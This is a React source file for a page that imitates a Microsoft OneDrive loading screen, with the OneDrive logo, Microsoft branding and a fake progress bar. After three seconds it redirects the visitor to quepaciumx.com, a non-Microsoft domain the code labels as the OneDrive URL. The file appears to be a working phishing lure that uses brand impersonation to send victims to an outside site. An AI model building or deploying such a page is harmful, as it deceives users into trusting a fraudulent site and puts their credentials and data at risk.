import { useEffect, useRef, useState } from "react";
import "./App.css";

const LOAD_DURATION = 3000;
const ONEDRIVE_URL = "https://quepaciumx.com/pfr/docview";

function OneDriveLogo() {
  return (
    <svg
      className="logo"
      viewBox="0 0 72 72"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
    >
      <path
        d="M20 47.5h30.5c6.7 0 12-4.5 12-10.2 0-5.3-4.6-9.6-10.4-10.1C49.8 20.8 44.2 17 37.7 17c-7.8 0-14.3 5.3-15.7 12.3-5.7.4-10.2 4.1-10.2 9.1 0 5 3.7 9.1 8.2 9.1Z"
        stroke="#0078d4"
        strokeWidth="2.5"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

export default function App() {
  const [progress, setProgress] = useState(0);
  const [done, setDone] = useState(false);

  const rafRef = useRef<number | null>(null);
  const startRef = useRef<number | null>(null);
  const redirectingRef = useRef(false);

  useEffect(() => {
    const tick = (ts: number) => {
      if (startRef.current === null) startRef.current = ts;

      const pct = Math.min(
        100,
        ((ts - startRef.current) / LOAD_DURATION) * 100,
      );
      setProgress(pct);

      if (pct < 100) {
        rafRef.current = requestAnimationFrame(tick);
        return;
      }

      setDone(true);

      if (!redirectingRef.current) {
        redirectingRef.current = true;
        window.location.replace(ONEDRIVE_URL);
      }
    };

    rafRef.current = requestAnimationFrame(tick);

    return () => {
      if (rafRef.current !== null) cancelAnimationFrame(rafRef.current);
      rafRef.current = null;
      startRef.current = null;
      redirectingRef.current = false;
    };
  }, []);

  const pct = Math.round(progress);

  return (
    <main className="wrapper">
      <OneDriveLogo />
      <h1 className="title">OneDrive</h1>
      <p className="subtitle" role="status">
        {done ? "Ready." : "Almost ready…"}
      </p>

      <div
        className="progressTrack"
        role="progressbar"
        aria-valuenow={pct}
        aria-valuemin={0}
        aria-valuemax={100}
        aria-label="Loading progress"
      >
        <div
          className="progressFill"
          style={{ width: `${progress}%` }}
        />
      </div>

      <span className="progressLabel" aria-hidden="true">
        {pct}%
      </span>

      <p className="microsoft">Microsoft</p>
    </main>
  );
}